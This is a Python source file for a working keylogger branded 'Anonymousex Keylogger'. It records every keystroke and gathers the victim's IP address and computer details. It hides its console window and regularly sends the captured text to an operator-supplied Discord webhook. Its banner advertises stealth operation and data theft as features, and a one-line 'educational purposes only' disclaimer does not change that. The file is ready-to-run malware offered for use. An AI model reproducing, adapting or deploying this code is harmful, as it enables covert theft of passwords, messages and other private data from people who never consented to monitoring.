import keyboard
import requests
import json
import threading
import time
import os
import sys
import socket
import platform
from datetime import datetime

class DiscordKeylogger:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.keys_buffer = []
        self.running = False
        self.user_ip = self.get_ip()
        self.computer_name = self.get_computer_info()
        self.start_time = datetime.now()
        
    def get_ip(self):
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return "Unknown"
    
    def get_computer_info(self):
        try:
            return f"{platform.node()} ({platform.system()} {platform.release()})"
        except:
            return "Unknown"
    
    def on_key_press(self, event):
        key = event.name
        if len(key) > 1:
            key = f"[{key.upper()}]"
        self.keys_buffer.append(key)
        
        if len(self.keys_buffer) >= 50:
            self.send_to_discord()
    
    def create_embed(self, keys_data):
        keys_text = ''.join(keys_data)
        if len(keys_text) > 1000:
            keys_text = keys_text[:1000] + "..."
        
        runtime = datetime.now() - self.start_time
        hours, remainder = divmod(runtime.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        runtime_str = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
        
        embed = {
            "title": "🔑 Keylogger Active",
            "color": 0x9932CC, 
            "fields": [
                {
                    "name": "Keystrokes",
                    "value": f"```\n{keys_text}\n```",
                    "inline": False
                },
                {
                    "name": "Total Keys",
                    "value": str(len(keys_data)),
                    "inline": True
                },
                {
                    "name": "User IP",
                    "value": self.user_ip,
                    "inline": True
                },
                {
                    "name": "Computer",
                    "value": self.computer_name,
                    "inline": True
                },
                {
                    "name": "Runtime",
                    "value": runtime_str,
                    "inline": True
                },
                {
                    "name": "Time",
                    "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "inline": True
                }
            ],
            "footer": {
                "text": "Anonymousex Keylogger | discord.gg/deza"
            },
            "timestamp": datetime.utcnow().isoformat()
        }
        
        return embed
    
    def send_to_discord(self):
        if not self.keys_buffer:
            return
        
        keys_to_send = self.keys_buffer.copy()
        self.keys_buffer = []
        
        embed = self.create_embed(keys_to_send)
        
        payload = {
            "embeds": [embed],
            "username": "Anonymousex Keylogger",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/2881/2881142.png"
        }
        
        try:
            requests.post(
                self.webhook_url,
                data=json.dumps(payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        except:
            self.keys_buffer = keys_to_send + self.keys_buffer
    
    def send_loop(self):
        while self.running:
            time.sleep(30)
            if self.keys_buffer:
                self.send_to_discord()
    
    def hide_console(self):
        if os.name == 'nt':
            try:
                import win32console
                import win32gui
                window = win32console.GetConsoleWindow()
                win32gui.ShowWindow(window, 0)
            except:
                pass
    
    def start(self):
        self.hide_console()
        self.running = True
        
        startup_embed = {
            "title": "🚀 Anonymousex Keylogger Started",
            "color": 0x00FF7F,  
            "fields": [
                {
                    "name": "Computer",
                    "value": self.computer_name,
                    "inline": True
                },
                {
                    "name": "IP Address",
                    "value": self.user_ip,
                    "inline": True
                },
                {
                    "name": "Start Time",
                    "value": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
                    "inline": True
                }
            ],
            "footer": {
                "text": "Anonymousex Keylogger | discord.gg/deza"
            }
        }
        
        startup_payload = {
            "embeds": [startup_embed],
            "username": "Anonymousex Keylogger"
        }
        
        try:
            requests.post(
                self.webhook_url,
                data=json.dumps(startup_payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        except:
            pass
        
        keyboard.on_press(self.on_key_press)
        send_thread = threading.Thread(target=self.send_loop, daemon=True)
        send_thread.start()
        
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.running = False
        if self.keys_buffer:
            self.send_to_discord()
        
        shutdown_embed = {
            "title": "🛑 Anonymousex Keylogger Stopped",
            "color": 0xFF4500,  
            "fields": [
                {
                    "name": "Total Runtime",
                    "value": str(datetime.now() - self.start_time),
                    "inline": True
                }
            ],
            "footer": {
                "text": "Anonymousex Keylogger | discord.gg/deza"
            }
        }
        
        shutdown_payload = {
            "embeds": [shutdown_embed],
            "username": "Anonymousex Keylogger"
        }
        
        try:
            requests.post(
                self.webhook_url,
                data=json.dumps(shutdown_payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        except:
            pass
        
        keyboard.unhook_all()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def animate_text(text, delay=0.01):  
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def print_ascii_art():
    ascii_art = [
        " █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ███████╗██╗  ██╗",
        "██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██╔════╝╚██╗██╔╝",
        "███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║█████╗   ╚███╔╝ ",
        "██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██╔══╝   ██╔██╗ ",
        "██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝███████╗██╔╝ ██╗",
        "╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝"
    ]
    
    colors = ["\033[95m", "\033[96m", "\033[94m", "\033[92m", "\033[93m", "\033[91m"]  
    
    for i, line in enumerate(ascii_art):
        print(f"{colors[i % len(colors)]}{line}\033[0m")
        time.sleep(0.05)  

def show_welcome():
    clear_screen()

    print_ascii_art()
    
    print()
    animate_text("\033[1;95m" + "╔══════════════════════════════════════════════════════════════════════╗" + "\033[0m")
    animate_text("\033[1;95m" + "║                 A N O N Y M O U S E X  K E Y L O G G E R             ║" + "\033[0m")
    animate_text("\033[1;95m" + "╚══════════════════════════════════════════════════════════════════════╝" + "\033[0m")
    print()
    
    animate_text("\033[1;96m" + "🌟 Premium Features:" + "\033[0m")
    animate_text("   • Real-time keystroke capture")
    animate_text("   • Discord webhook integration")
    animate_text("   • System intelligence gathering")
    animate_text("   • Stealth background operation")
    animate_text("   • Automated data transmission")
    print()
    animate_text("\033[1;94m" + "🔗 Join our Discord for support: discord.gg/deza" + "\033[0m")
    print()
    animate_text("\033[1;91m" + "⚠️  Legal Disclaimer: For educational purposes only!" + "\033[0m")
    animate_text("   Use only on systems you own or have explicit permission.")
    print()
    print("\033[1;92m" + "=" * 70 + "\033[0m")

def get_webhook_url():
    print("\n\033[1;94m" + "📝 Webhook Configuration" + "\033[0m")
    print("🔗 Get webhook from: Discord Server → Settings → Webhooks")
    print()
    
    while True:
        webhook_url = input("\033[1;96m" + "🌐 Enter Discord Webhook URL: " + "\033[0m").strip()
        
        if not webhook_url:
            print("\033[1;91m" + "❌ URL cannot be empty. Please try again.\n" + "\033[0m")
            continue
            
        if not webhook_url.startswith('https://discord.com/api/webhooks/'):
            print("\033[1;91m" + "❌ Invalid Discord webhook URL format." + "\033[0m")
            print("   Format should be: https://discord.com/api/webhooks/...")
            print("   Please check and try again.\n")
            continue
            
        print("🔍 Testing webhook connection...")
        try:
            test_payload = {
                "content": "✅ Anonymousex Keylogger connection test successful!",
                "username": "Anonymousex Keylogger",
                "embeds": [{
                    "title": "🔗 Connection Test",
                    "description": "Anonymousex Keylogger is ready to start!",
                    "color": 0x00FF7F,  
                    "footer": {
                        "text": "Anonymousex Keylogger | discord.gg/deza"
                    }
                }]
            }
            response = requests.post(
                webhook_url,
                data=json.dumps(test_payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code in [200, 204]:
                print("\033[1;92m" + "✅ Webhook test successful! Connection established." + "\033[0m")
                return webhook_url
            else:
                print(f"\033[1;91m" + f"❌ Webhook test failed (Status: {response.status_code})" + "\033[0m")
                print("   Please check your webhook URL and permissions.\n")
                
        except requests.exceptions.RequestException as e:
            print(f"\033[1;91m" + f"❌ Connection error: {e}" + "\033[0m")
            print("   Check your internet connection and webhook URL.\n")
        
        retry = input("\033[1;93m" + "🔄 Press Enter to try again or type 'exit' to quit: " + "\033[0m").strip().lower()
        if retry == 'exit':
            print("👋 Exiting...")
            sys.exit(0)

def show_starting_animation():
    print("\n\033[1;95m" + "🎯 Starting Anonymousex Keylogger..." + "\033[0m")
    
    animations = [
        "🛠️  Loading modules",
        "🔧 Initializing hooks",
        "📡 Establishing connection",
        "🚀 Launching keylogger"
    ]
    
    for i, text in enumerate(animations):
        for j in range(3):
            dots = "." * (j + 1)
            print(f"\r{text}{dots}   ", end='', flush=True)
            time.sleep(0.2) 
    
    print("\r\033[1;92m" + "✅ Initialization complete! Ready to monitor." + "\033[0m" + " " * 20)
    time.sleep(1.0)  

def main():
    show_welcome()
    webhook_url = get_webhook_url()
    
    show_starting_animation()
    
    print("\n" + "\033[1;96m" + "=" * 70 + "\033[0m")
    print("\033[1;92m" + "🌙 Anonymousex Keylogger is now running in background!" + "\033[0m")
    print("   • Press Ctrl+C in this window to stop")
    print("   • Console will minimize automatically")
    print("   • Data will be sent to your Discord webhook")
    print()
    print("\033[1;95m" + "💬 Join our Discord for support: discord.gg/deza" + "\033[0m")
    print("\033[1;96m" + "=" * 70 + "\033[0m")
    
    time.sleep(2)  
    
    keylogger = DiscordKeylogger(webhook_url=webhook_url)
    
    try:
        keylogger.start()
    except Exception as e:
        print(f"\033[1;91m" + f"❌ Error starting keylogger: {e}" + "\033[0m")
        print("   Please check your dependencies and try again.")
    except KeyboardInterrupt:
        print("\n\033[1;93m" + "🛑 Stopping keylogger..." + "\033[0m")
        keylogger.stop()

if __name__ == "__main__":
    main()
